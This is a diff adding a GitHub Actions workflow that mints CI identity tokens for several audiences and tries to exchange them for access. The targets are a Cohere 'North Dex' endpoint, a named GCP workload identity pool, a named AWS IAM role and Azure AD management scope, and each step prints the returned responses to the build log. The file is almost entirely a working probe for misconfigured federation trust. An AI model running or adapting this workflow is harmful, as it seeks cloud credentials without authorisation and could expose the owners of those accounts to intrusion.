@@ -1,0 +1,119 @@
+name: t7-oidc-exchange
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  exchange:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v6
+        id: get-tokens
+        with:
+          script: |
+            const fs = require('fs');
+            
+            // Get OIDC token with different audiences
+            async function fetchToken(audience) {
+              try {
+                return await core.getIDToken(audience);
+              } catch(e) {
+                return null;
+              }
+            }
+            
+            const githubToken = await core.getIDToken('github');
+            const awsToken = await core.getIDToken('sts.amazonaws.com');
+            const azureToken = await core.getIDToken('api://AzureADTokenExchange');
+            
+            fs.writeFileSync('/tmp/oidc_github.txt', githubToken || 'null');
+            fs.writeFileSync('/tmp/oidc_aws.txt', awsToken || 'null');
+            fs.writeFileSync('/tmp/oidc_azure.txt', azureToken || 'null');
+            
+            console.log('github_token_length=' + (githubToken ? githubToken.length : 0));
+            console.log('aws_token_length=' + (awsToken ? awsToken.length : 0));
+            console.log('azure_token_length=' + (azureToken ? azureToken.length : 0));
+            console.log('github_aud=' + (githubToken ? JSON.parse(atob(githubToken.split('.')[1])).aud : 'null'));
+            console.log('aws_aud=' + (awsToken ? JSON.parse(atob(awsToken.split('.')[1])).aud : 'null'));
+            console.log('azure_aud=' + (azureToken ? JSON.parse(atob(azureToken.split('.')[1])).aud : 'null'));
+
+      - name: Try North Dex token exchange
+        run: |
+          set +e
+          
+          # Try with github token
+          TG=$(cat /tmp/oidc_github.txt)
+          if [ -n "$TG" ] && [ "$TG" != "null" ]; then
+            echo "=== North Dex: github token ==="
+            curl -s -X POST "https://north.cohere.com/dex/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "client_id=north" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "subject_token=${TG}" \
+              -d "scope=openid%20profile%20email%20groups" 2>&1
+            echo ""
+          fi
+          
+          # Try with aws token
+          TA=$(cat /tmp/oidc_aws.txt)
+          if [ -n "$TA" ] && [ "$TA" != "null" ]; then
+            echo "=== North Dex: aws token ==="
+            curl -s -X POST "https://north.cohere.com/dex/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "client_id=north" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "subject_token=${TA}" \
+              -d "scope=openid%20profile%20email%20groups" 2>&1
+            echo ""
+          fi
+
+      - name: Try GCP STS exchange
+        run: |
+          set +e
+          
+          TG=$(cat /tmp/oidc_github.txt)
+          TA=$(cat /tmp/oidc_aws.txt)
+          
+          # Try GCP STS with github token
+          if [ -n "$TG" ] && [ "$TG" != "null" ]; then
+            echo "=== GCP STS: github token ==="
+            curl -s -X POST "https://sts.googleapis.com/v1/token" \
+              -H "Content-Type: application/json" \
+              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"${TG}\",\"audience\":\"//iam.googleapis.com/projects/568425278105/locations/global/workloadIdentityPools/github-actions/providers/github-provider\"}" 2>&1
+            echo ""
+          fi
+          
+          # Try GCP STS with aws token
+          if [ -n "$TA" ] && [ "$TA" != "null" ]; then
+            echo "=== GCP STS: aws token ==="
+            curl -s -X POST "https://sts.googleapis.com/v1/token" \
+              -H "Content-Type: application/json" \
+              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"${TA}\",\"audience\":\"//iam.googleapis.com/projects/568425278105/locations/global/workloadIdentityPools/github-actions/providers/github-provider\"}" 2>&1
+            echo ""
+          fi
+
+      - name: Try AWS STS exchange
+        run: |
+          set +e
+          
+          TA=$(cat /tmp/oidc_aws.txt)
+          if [ -n "$TA" ] && [ "$TA" != "null" ]; then
+            echo "=== AWS STS: aws token (aud=sts.amazonaws.com) ==="
+            curl -s -X POST "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&RoleArn=arn:aws:iam::704834779610:role/GitHubActionsRole&WebIdentityToken=${TA}&RoleSessionName=test" 2>&1
+            echo ""
+          fi
+
+      - name: Try Azure AD exchange
+        run: |
+          set +e
+          
+          TZ=$(cat /tmp/oidc_azure.txt)
+          if [ -n "$TZ" ] && [ "$TZ" != "null" ]; then
+            echo "=== Azure AD: azure token ==="
+            curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+              -d "grant_type=client_credentials" \
+              -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+              -d "client_assertion=${TZ}" \
+              -d "scope=https://management.azure.com/.default" 2>&1
+            echo ""
+          fi
